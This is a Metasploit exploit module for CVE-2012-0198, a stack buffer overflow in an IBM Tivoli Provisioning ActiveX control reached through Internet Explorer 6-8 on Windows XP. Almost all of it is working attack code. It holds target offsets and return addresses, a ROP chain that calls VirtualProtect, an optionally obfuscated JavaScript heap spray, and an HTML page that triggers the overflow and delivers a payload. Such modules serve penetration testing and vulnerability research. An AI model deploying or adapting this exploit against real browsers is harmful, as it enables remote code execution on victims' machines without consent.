# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##
 
require &#039;msf/core&#039;
 
class Metasploit3 < Msf::Exploit::Remote
    Rank = NormalRanking
 
    include Msf::Exploit::Remote::HttpServer::HTML
    include Msf::Exploit::Remote::BrowserAutopwn
 
    autopwn_info({
        :os_name    => OperatingSystems::WINDOWS,
        :ua_name    => HttpClients::IE,
        :ua_minver  => "6.0",
        :ua_maxver  => "8.0",
        :javascript => true,
        :rank       => NormalRanking,
        :classid    => "{84B74E82-3475-420E-9949-773B4FB91771}",
        :vuln_test  => "RunAndUploadFile",
    })
 
    def initialize(info={})
        super(update_info(info,
            &#039;Description&#039;    => %q{
                    This module exploits a buffer overflow vulnerability in the
                Isig.isigCtl.1 ActiveX installed with IBM Tivoli Provisioning
 
                The vulnerability is found in the "RunAndUploadFile" method
                where the "OtherFields" parameter with user controlled data
                is used to build a "Content-Dispoition" header and attach
                contents in a insecure way which allows to overflow a buffer
                in the stack.
            },
            &#039;License&#039;        => MSF_LICENSE,
            &#039;Author&#039;         =>
                [
                    &#039;Andrea Micalizzi aka rgod&#039;, # Vulnerability discovery
                    &#039;juan vazquez&#039;, # Metasploit module
                    &#039;sinn3r&#039; # Metasploit module
                ],
            &#039;References&#039;     =>
                [
                    [ &#039;CVE&#039;,   &#039;2012-0198&#039; ],
                    [ &#039;OSVDB&#039;, &#039;79735&#039; ],
                    [ &#039;BID&#039;,   &#039;52252&#039; ],
                    [ &#039;URL&#039;,   &#039;http://www.zerodayinitiative.com/advisories/ZDI-12-040/&#039; ]
                ],
            &#039;Payload&#039;        =>
                {
                    &#039;Space&#039;       => 1000,
                    &#039;BadChars&#039;    => "\x00",
                    &#039;DisableNops&#039; => true
                },
            &#039;DefaultOptions&#039;  =>
                {
                    &#039;InitialAutoRunScript&#039; => &#039;migrate -f&#039;
                },
            &#039;Platform&#039;       => &#039;win&#039;,
            &#039;Targets&#039;        =>
                [
                    # isig.dll 2.44.282.0
                    [ &#039;Automatic&#039;, {} ],
                    [
                        &#039;IE 6 on Windows XP SP3&#039;,
                        {
                            &#039;Rop&#039;         => nil,
                            &#039;Offset&#039;      => 161, # length is strlen("submit") dependant
                            &#039;OffsetShell&#039; => &#039;0x800 - code.length&#039;,
                            &#039;ebp&#039;         => 0x09090909,
                            &#039;Ret&#039;         => 0x09090909
                        }
                    ],
                    [
                        &#039;IE 7 on Windows XP SP3&#039;,
                        {
                            &#039;Rop&#039;         => nil,
                            &#039;Offset&#039;      => 161, # length is strlen("submit") dependant
                            &#039;OffsetShell&#039; => &#039;0x800 - code.length&#039;,
                            &#039;ebp&#039;         => 0x09090909,
                            &#039;Ret&#039;         => 0x09090909
                        }
                    ],
                    [
                        &#039;IE 8 on Windows XP SP3&#039;,
                        {
                            &#039;Rop&#039;         => :jre,
                            &#039;Offset&#039;      => 161, # length is strlen("submit") dependant
                            &#039;OffsetShell&#039; => &#039;0x480&#039;,
                            &#039;ebp&#039;         => 0x09090920,
                            &#039;Ret&#039;         => 0x7c375a3d # stackpivot from msvcr71.dll # mov esp, ebp # pop ebp # ret
                        }
                    ]
                ],
            &#039;Privileged&#039;     => false,
            &#039;DisclosureDate&#039; => "Mar 01 2012",
            &#039;DefaultTarget&#039;  => 0))
 
            register_options(
                [
                    OptBool.new(&#039;OBFUSCATE&#039;, [false, &#039;Enable JavaScript obfuscation&#039;])
                ], self.class)
    end
 
    def get_target(agent)
        #If the user is already specified by the user, we&#039;ll just use that
        return target if target.name != &#039;Automatic&#039;
 
        if agent =~ /NT 5\.1/ and agent =~ /MSIE 6/
            return targets[1]  #IE 6 on Windows XP SP3
        elsif agent =~ /NT 5\.1/ and agent =~ /MSIE 7/
            return targets[2]  #IE 7 on Windows XP SP3
        elsif agent =~ /NT 5\.1/ and agent =~ /MSIE 8/
            return targets[3]  #IE 8 on Windows XP SP3
        else
            return nil
        end
    end
 
    def get_payload(t, cli)
 
        if t[&#039;Rop&#039;].nil?
            code = ""
        else
            #Fix the stack to avoid anything busted
            code = "\x81\xC4\x54\xF2\xFF\xFF"
        end
        code << payload.encoded
 
        # No rop. Just return the payload.
        return code if t[&#039;Rop&#039;].nil?
 
        # ROP chain generated by mona.py - See corelan.be
        case t[&#039;Rop&#039;]
        when :jre
            print_status("#{cli.peerhost.ljust(16)} #{self.shortname} Using JRE ROP")
            exec_size = 0xffffffff - code.length + 1
            rop =
            [
                0x7c37653d,  # POP EAX # POP EDI # POP ESI # POP EBX # POP EBP # RETN
                exec_size,   # Value to NEG
                0x7c347f98,  # RETN (ROP NOP)
                0x7c3415a2,  # JMP [EAX]
                0xffffffff,
                0x7c376402,  # skip 4 bytes
                0x7c351e05,  # NEG EAX # RETN
                0x7c345255,  # INC EBX # FPATAN # RETN
                0x7c352174,  # ADD EBX,EAX # XOR EAX,EAX # INC EAX # RETN
                0x7c344f87,  # POP EDX # RETN
                0xffffffc0,  # Value to negate, will become 0x00000040
                0x7c351eb1,  # NEG EDX # RETN
                0x7c34d201,  # POP ECX # RETN
                0x7c38b001,  # &Writable location
                0x7c347f97,  # POP EAX # RETN
                0x7c37a151,  # ptr to &VirtualProtect() - 0x0EF [IAT msvcr71.dll]
                0x7c378c81,  # PUSHAD # ADD AL,0EF # RETN
                0x7c345c30,  # ptr to &#039;push esp #  ret &#039;
            ].pack("V*")
        end
 
        code = rop + code
        return code
    end
 
    def on_request_uri(cli, request)
 
        agent = request.headers[&#039;User-Agent&#039;]
        my_target = get_target(agent)
 
        # Avoid the attack if the victim doesn&#039;t have the same setup we&#039;re targeting
        if my_target.nil?
            print_error("#{cli.peerhost.ljust(16)} #{self.shortname} Browser not supported: #{agent.to_s}")
            send_not_found(cli)
            return
        end
 
        print_status("#{cli.peerhost.ljust(16)} #{self.shortname} Client requesting: #{request.uri}")
 
        p = get_payload(my_target, cli)
        js_code = Rex::Text.to_unescape(p, Rex::Arch.endian(my_target.arch))
        js_nops = Rex::Text.to_unescape("\x90"*4, Rex::Arch.endian(my_target.arch))
 
        js_spray = <<-JS
        var heap_obj = new heapLib.ie(0x20000);
        var code = unescape("#{js_code}");
        var nops = unescape("#{js_nops}");
 
        while (nops.length < 0x80000) nops += nops;
        var offset = nops.substring(0, #{my_target[&#039;OffsetShell&#039;]});
        var shellcode = offset + code + nops.substring(0, 0x800-code.length-offset.length);
 
        while (shellcode.length < 0x40000) shellcode += shellcode;
        var block = shellcode.substring(0, (0x80000-6)/2);
 
        heap_obj.gc();
        for (var i=0; i < 0x1A0; i++) {
            heap_obj.alloc(block);
        }
 
        JS
 
        js_spray = heaplib(js_spray, {:noobfu => true})
 
        if datastore[&#039;OBFUSCATE&#039;]
            js_spray = ::Rex::Exploitation::JSObfu.new(js_spray)
            js_spray.obfuscate
        end
 
        bof = rand_text_alpha(my_target[&#039;Offset&#039;])
        bof << [my_target[&#039;ebp&#039;]].pack("V") # ebp
        bof << [my_target.ret].pack("V") # eip
 
        html = <<-HTML
        <html>
        <head>
        <script>
            #{js_spray}
        </script>
        </head>
        <object classid=&#039;clsid:84B74E82-3475-420E-9949-773B4FB91771&#039; id=&#039;isig&#039;></object>
        <script>
            var url = "http://#{Rex::Socket.source_address(&#039;1.2.3.4&#039;)}:#{datastore[&#039;SRVPORT&#039;]}/tpmx/uploadEG2.do";
            var fields = "submit:#{bof};FROM_EMAIL:true;userKey:2";
            var flags = "-level5";
            msg = isig.RunAndUploadFile(url, fields, flags);
        </script>
        </html>
        HTML
 
        html = html.gsub(/^\t\t/, &#039;&#039;)
 
        print_status("#{cli.peerhost.ljust(16)} #{self.shortname} Sending html")
        send_response(cli, html, {&#039;Content-Type&#039;=>&#039;text/html&#039;})
    end
 
end
 
=begin
 
* Vulnerability notes
 
The Dangerous strcat allows to attach user-controlled contents after
the Content-disposition header:
 
.text:100040B0 Src             = byte ptr -100h
...
.text:100040DD                 push    [ebp+Source]    ; Source => User controlled via "fields" param
.text:100040E0                 lea     eax, [ebp+Src]
.text:100040E6                 push    eax             ; Dest => Local variable where the Content-disposition header
                                                                                                             ; has been stored
.text:100040E7                 call    _strcat ; strcat used by this module to overflow
 
Function isn&#039;t protected with stack cookies so get
the control flow is easy by overwriting the saved EIP
on the stack.
 
=end



